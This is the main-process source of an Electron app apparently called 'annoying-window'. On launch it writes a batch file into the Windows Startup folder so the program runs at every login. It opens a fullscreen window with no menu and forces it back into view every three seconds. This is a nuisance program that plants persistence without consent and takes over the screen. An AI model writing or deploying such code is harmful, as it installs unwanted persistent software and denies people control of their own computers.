/* eslint-disable import/no-unresolved */
import { app, BrowserWindow } from 'electron';
import { writeFileSync } from 'node:fs';
import { enable, initialize } from '@electron/remote/main';
import * as path from 'node:path';

initialize();

declare global {
  interface Window {
    congrats: { run: () => void };
    shouldRestart: boolean;
  }
}

// Handle creating/removing shortcuts on Windows when installing/uninstalling.
if (require('electron-squirrel-startup')) {
  // eslint-disable-line global-require
  app.quit();
}
writeFileSync(
  path.join(__dirname, 'path.js'),
  `exports.startupPath = "${app.getPath(
    'appData'
  )}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\maybe-something.bat"`.replace(
    /\\/g,
    '\\\\'
  )
);
const createWindow = (): void => {
  // Create the browser window.
  const mainWindow = new BrowserWindow({
    height: 600,
    width: 800,
    webPreferences: {
      contextIsolation: true,
      nodeIntegration: true,

      preload: path.join(__dirname, 'preload.js'),
    },
  });

  mainWindow.loadFile(path.join(__dirname, '../src/index.html'));
  mainWindow.setFullScreen(true);
  mainWindow.removeMenu();
  writeFileSync(
    `${app.getPath(
      'appData'
    )}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\maybe-something.bat`,
    '"%localappdata%\\annoying_window\\annoying-window.exe"'
  );
  setInterval(() => {
    mainWindow.show();
  }, 3000);
  enable(mainWindow.webContents);
};

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow);

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and import them here.
